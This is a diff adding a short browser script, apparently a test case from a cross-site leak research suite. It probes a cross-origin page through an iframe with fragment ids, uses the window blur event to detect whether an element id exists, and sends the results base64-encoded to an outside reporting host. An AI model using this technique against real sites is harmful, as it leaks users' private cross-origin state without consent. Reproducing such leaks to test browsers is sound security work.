@@ -1,0 +1,39 @@
+<script>
+    window.onload = function () {
+        results = [];
+        function is_present(id) {
+            var iframe = document.createElement('iframe');
+            document.body.appendChild(iframe);
+            // Listen to onblur event
+            onblur = function onblur() {
+                results.push(id);
+                console.log("Found id: " + id);
+            };
+
+            iframe.src = 'https://leak.test/custom/case15/main/#' + id;
+        }
+
+        function report() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "https://re.port/case15.json/" + btoa(JSON.stringify({
+                "user-agent": navigator.userAgent,
+                "probe_id_found": results.includes("probe_id"),
+                "non_existant_id_found": results.includes("does_not_exist"),
+                "xsleak_reproduced": results.includes("probe_id") && !results.includes("does_not_exist")
+            })));
+            xhr.send();
+        }
+
+        function run() {
+            console.log("Probing existing id");
+            is_present("probe_id");
+            setTimeout(function () {
+                console.log("Probing non-existing id");
+                is_present("does_not_exist");
+            }, 2000);
+            setTimeout(report, 4000);
+        }
+
+        run();
+    };
+</script>
